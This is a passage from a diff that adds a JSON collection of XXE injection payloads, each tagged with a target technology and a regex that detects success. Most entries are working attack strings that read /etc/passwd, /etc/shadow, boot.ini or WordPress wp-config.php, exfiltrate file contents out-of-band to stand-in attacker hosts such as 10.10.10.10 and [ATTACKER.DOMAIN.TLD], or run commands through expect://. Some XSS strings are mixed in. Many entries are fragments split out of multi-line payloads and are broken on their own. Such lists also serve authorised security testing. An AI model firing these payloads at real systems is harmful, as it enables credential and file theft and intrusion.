+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247679",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247680",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" standalone=\"yes\"?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247681",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247682",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247683",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247684",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE svg [",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247685",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ELEMENT svg ANY >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247686",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % sp SYSTEM \"http://10.10.10.10:8080/xxe.xml\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247687",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247688",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247689",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247690",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<flowRoot font-size=\"15\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247691",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<flowRegion>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247692",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247693",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</flowRegion>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247694",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<flowDiv>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247695",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<flowPara>&exfil;</flowPara>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247696",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</flowDiv>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247697",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</flowRoot>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247698",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247699",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247700",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<soap:Body>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247701",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247702",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://10.10.10.10:22/\"> %dtd;]><xxx/>]]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247703",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "</soap:Body>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247725",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247726",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<cdl>&rrr;</cdl>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247727",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247728",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247729",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247730",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % d SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247731",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247733",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!-- Load the contents of a sensitive file into a variable -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247734",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % payload SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247735",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247736",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x=%payload;\">'>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247738",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247739",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM \"file:///etc/passwd\"> ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247740",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM \"file:///c:/boot.ini\"> ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247741",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM \"http://crowdshield.com/.testing/rfi_vuln.txt\"> ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247742",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247743",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><change-log><text>Hello World</text></change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247744",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><change-log><text>&quot;Hello World&quot;</text></change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247745",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE change-log[ <!ENTITY myEntity \"World\"> ]><change-log><text>Hello &myEntity;</text></change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247746",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE change-log[ <!ENTITY myEntity \"World\"><!ENTITY myQuote \"&quot;\"> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247747",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY systemEntity SYSTEM \"robots.txt\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247748",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<change-log> <text>&systemEntity;</text> </change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247749",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM \"robots.txt\"> ]> <change-log> <text>&systemEntity;</text> </change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247750",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM \"../../../../boot.ini\"> ]> <change-log> <text>&systemEntity;</text> </change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247751",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM \"robots.txt\"> ]> <change-log> <text>&systemEntity;</text>; </change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247752",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247753",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><change-log><text><script>alert(1)</script></text></change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247754",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"https://crowdshield.com/.testing/rfi_vuln.txt\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247755",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://xerosecurity.com/.testing/rfi_vuln.txt\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247756",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247757",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247758",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml SRC=\"https://crowdshield.com/.testing/rfi_vuln.txt\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247759",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"https://crowdshield.com/.testing/xss.html\"><xss:xss>XSS</xss:xss></HTML>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247760",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml SRC=\"https://crowdshield.com/.testing/xss.html\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247761",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM \"https://crowdshield.com/.testing/rfi_vuln.txt\">%f5a30; ]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247764",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM \"../../../boot.ini\" ]> <change-log> <text>&systemEntity;</text>; </change-log>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247765",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM \"php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini\" >]><doc><test>Contents of file: &xxe;</test></doc>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247766",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247767",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247768",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247769",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM \"https://crowdshield.com/.testing/rfi.txt\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247775",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "WordPress",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"utf-16\" standalone=\"yes\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247776",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<xml version=\"1.0\"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM \"../../../../../../../etc/passwd\">]><methodCall><methodName>&xxe</methodName></methodCall>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247777",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml version=\"1.0\"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM \"http://xerosecurity.com/.testing/rfi_vuln.txt\">]><methodCall><methodName>&xxe</methodName></methodCall>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247778",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml version=\"1.0\"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM \"https://crowdshield.com/.testing/rfi_vuln.txt\">]><methodCall><methodName>&xxe</methodName></methodCall>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247779",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247780",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "WordPress",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM \"php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php\" >]><doc><test>Contents of file: &xxe;</test></doc>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247781",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247782",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": " <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo> <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM \"http://www.attacker.com/text.txt\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247786",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Linux",
+    "injection_point": "body_xml",
